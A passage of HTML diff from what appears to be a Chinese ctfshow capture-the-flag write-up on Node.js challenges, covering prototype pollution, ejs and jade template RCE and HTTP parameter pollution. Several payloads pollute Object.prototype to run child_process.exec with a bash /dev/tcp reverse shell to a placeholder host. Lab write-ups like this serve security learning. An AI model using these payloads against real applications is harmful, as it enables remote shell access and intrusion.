-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Js"><div class="codebox"><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br><span class="line"><span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;</span><br><span class="line"> res.<span class="title function_">end</span>(flag);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>可以看到，<code>user.__proto__</code>并不是<code>Object.prototype</code>，<code>user.__proto__.__proto__</code>才是。</p>
 <p>因此污染两层即可：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;端口 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Haxe"><div class="codebox"><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:<span class="type"></span>&#123;<span class="string">&quot;__proto__&quot;</span>:<span class="type"></span>&#123;<span class="string">&quot;query&quot;</span>:<span class="type"></span>&quot;<span class="keyword">return</span> global.process.mainModule.constructor._load(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/端口 0&gt;&amp;1\&quot;&#x27;</span>)<span class="string">&quot;&#125;&#125;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
 <h1><span id="web341-ejs-rce">web341 ejs rce</span></h1><p>预期解ejs rce</p>
 <p>先进行一下原型链污染，再刷新一次即可</p>
 <p>payload:</p>
-<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx&#x2F;xxx 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Haxe"><div class="codebox"><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:<span class="type"></span>&#123;<span class="string">&quot;__proto__&quot;</span>:<span class="type"></span>&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="type"></span>&quot;_tmp1;global.process.mainModule.require(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/xxx 0&gt;&amp;1\&quot;&#x27;</span>);<span class="keyword">var</span> __tmp2<span class="string">&quot;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
 <h1><span id="web342-343-jade原型链污染">web342、343 jade原型链污染</span></h1><p><strong>jade原型链污染</strong></p>
 <p>payload:</p>
-<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx&#x2F;810&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Scilab"><div class="codebox"><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Block&quot;</span>,<span class="string">&quot;nodes&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;</span>child_process&#x27;).<span class="built_in">exec</span>(<span class="string">&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/810&gt;&amp;1\&quot;&#x27;</span>)<span class="string">&quot;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>在login页面打上去之后随便访问下，就会反弹。</p>
 <p><a target="_blank" rel="noopener" href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn)</a></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a></p>
 <h1><span id="web344-http参数污染">web344 HTTP参数污染</span></h1><p>HTTP参数污染。</p>
 <p>部分源码：</p>
-<pre class="line-numbers language-js" data-language="js"><code class="language-js">router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">var</span> flag <span class="token operator">=</span> <span class="token string">'flag_here'</span><span class="token punctuation">;</span>
-  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">8c|2c|\,</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-  	res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag :)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span>
-  <span class="token keyword">var</span> query <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">if</span><span class="token punctuation">(</span>query<span class="token punctuation">.</span>name<span class="token operator">===</span><span class="token string">'admin'</span><span class="token operator">&amp;&amp;</span>query<span class="token punctuation">.</span>password<span class="token operator">===</span><span class="token string">'ctfshow'</span><span class="token operator">&amp;&amp;</span>query<span class="token punctuation">.</span>isVIP<span class="token operator">===</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-  	res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-  	res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag. :)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span>
-
-<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Js"><div class="codebox"><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">url</span>.<span class="title function_">match</span>(<span class="regexp">/8c|2c|\,/ig</span>))&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">query</span>.<span class="property">query</span>);</span><br><span class="line">  <span class="keyword">if</span>(query.<span class="property">name</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;query.<span class="property">password</span>===<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.<span class="property">isVIP</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag. :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>url 中不能包含大小写 <code>8c</code>、<code>2c</code> 和 <code>逗号</code></p>
 <p>先构造一个正常请求</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Ruby"><div class="codebox"><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="string">?q</span>uery=&#123;<span class="string">&quot;name&quot;</span><span class="symbol">:<span class="string">&quot;admin&quot;</span></span>,<span class="string">&quot;password&quot;</span><span class="symbol">:<span class="string">&quot;ctfshow&quot;</span></span>,<span class="string">&quot;isVIP&quot;</span><span class="symbol">:true</span>&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>发现题目会过滤掉逗号，尝试 URL 编码， <code>urlencode(&quot;,&quot;) = %2c</code> 发现 <code>2c</code> 也被过滤</p>
 <p>HTTP协议中 允许 同名参数 出现多次，例如<code>?a=1&amp;a=2</code> ，有的服务端取的<code>1</code>，有的取的<code>2</code> 。不同服务端对同名参数处理都是不一样的，下面链接列举了一些：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/AtesetEnginner/p/12375499.html">https://www.cnblogs.com/AtesetEnginner/p/12375499.html</a></p>
 <p><u>nodejs 会把同名参数以<strong>数组</strong>的形式存储，并且 <code>JSON.parse</code> 可以正常解析。</u></p>
 <p>因此构造</p>
-<pre class="line-numbers language-none"><code class="language-none">?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;&amp;query&#x3D;&quot;password&quot;:&quot;%63tfshow&quot;&amp;query&#x3D;&quot;isVIP&quot;:true&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Ruby"><div class="codebox"><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?q</span>uery=&#123;<span class="string">&quot;name&quot;</span><span class="symbol">:<span class="string">&quot;admin&quot;</span>&amp;query=<span class="string">&quot;password&quot;</span></span><span class="symbol">:<span class="string">&quot;%63tfshow&quot;</span>&amp;query=<span class="string">&quot;isVIP&quot;</span></span><span class="symbol">:true</span>&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <blockquote>
 <p>这里把 ctfshow 的 c 进行url编码，是因为 双引号 的url编码是 <code>%22</code>，和 <code>c</code> 连接起来就是 <code>%22c</code>，会匹配到正则表达式。</p>
 </blockquote>
+</div><div class="post-reward"><div class="post-reward-btn" title="赞赏作者"><img src="/assets/images/svg/uc/uc-gift.svg" class="icon noview" alt="Icon"><span></span></div><div class="post-reward-content"><div class="post-reward-text"></div><div class="post-reward-list"><a href="/null" target="_blank">致谢名单</a></div></div></div><div class="post-copyright"><div class="post-copyright-info">本作品由 jjjing 于 2023-01-03 21:10:33 发布</div><div class="post-copyright-link"><span>作品地址：<a href="https://jinggg1123.github.io/archives/2023/01/03/ctfshownodejs/">ctfshow_web入门_nodejs</a></span><button class="copy-text" type="button" data-text="https://jinggg1123.github.io/archives/2023/01/03/ctfshownodejs/">复制</button></div><div class="post-copyright-detail">除特别声明外，本站作品均采用 <a href='https://creativecommons.org/licenses/by-nc-sa/4.0/' title='Attribution-NonCommercial-ShareAlike' target='_blank'>CC BY-NC-SA 4.0</a> 许可协议，转载请注明来自 <a href='/'>jjjing</a></div><img class="post-copyright-icon noview" src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></div><div class="post-tail-tags"></div><div class="post-nav"><a class="post-nav-prev" href="/2023/01/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A7%BF%E5%8A%BF%E9%9B%86%E6%80%BB/" title="PHP反序列化姿势集总">上一篇<span>PHP反序列化姿势集总</span></a><a class="post-nav-next" href="/2022/12/19/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/" title="sql无列名注入">下一篇<span>sql无列名注入</span></a></div></div><aside id="post-sidebar" status="show" active=""><div id="toc-container"><div class="toc-title"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"><span>目录</span></div><div class="toc-content" id="toc-div"><ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">web334 JS大小写特性</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">web335 JS 的 RCE</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">web336 有过滤的RCE</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">web337 js变量</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">web338 原型链污染</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">web339 原型链污染</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">web340 原型链污染</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">web341 ejs rce</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">web342、343 jade原型链污染</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link"><span class="toc-list-text">web344 HTTP参数污染</span></a></li></ol></div></div><script>document.addEventListener('DOMContentLoaded', function () {
+  var headings = Array.from(document.querySelectorAll('.post h1, .post h2, .post h3, .post h4, .post h5, .post h6'));
+  var usedHeadings = [];
 
-  </div>
-</article>
-
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-        
-          <li><a href="/">首页</a></li>
-        
-          <li><a href="/archives/">归档</a></li>
-        
-          <li><a href="/categories/">分类</a></li>
-        
-          <li><a href="/about/">关于</a></li>
-        
-      </ul>
-    </div>
-
-    
-    
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">web334 JS大小写特性</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">web335 JS 的 RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">web336 有过滤的RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">web337 js变量</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">web338 原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">web339 原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">web340 原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">web341 ejs rce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">web342、343 jade原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">10.</span> <span class="toc-text">web344 HTTP参数污染</span></a></li></ol>
-      </div>
-    
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/&text=ctfshow_web入门_nodejs"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/&title=ctfshow_web入门_nodejs"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/&is_video=false&description=ctfshow_web入门_nodejs"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=ctfshow_web入门_nodejs&body=Check out this article: https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/&title=ctfshow_web入门_nodejs"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/&title=ctfshow_web入门_nodejs"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/&title=ctfshow_web入门_nodejs"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/&title=ctfshow_web入门_nodejs"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/&name=ctfshow_web入门_nodejs&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://itsbefore.github.io/archives/2023/01/03/ctfshownodejs/&t=ctfshow_web入门_nodejs"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
-    </div>
-
-  </div>
-</div>
-
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
-    
-    
-    2021-2025
-    before
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-        <!--
-       --><li><a href="/">首页</a></li><!--
-     --><!--
-       --><li><a href="/archives/">归档</a></li><!--
-     --><!--
-       --><li><a href="/categories/">分类</a></li><!--
-     --><!--
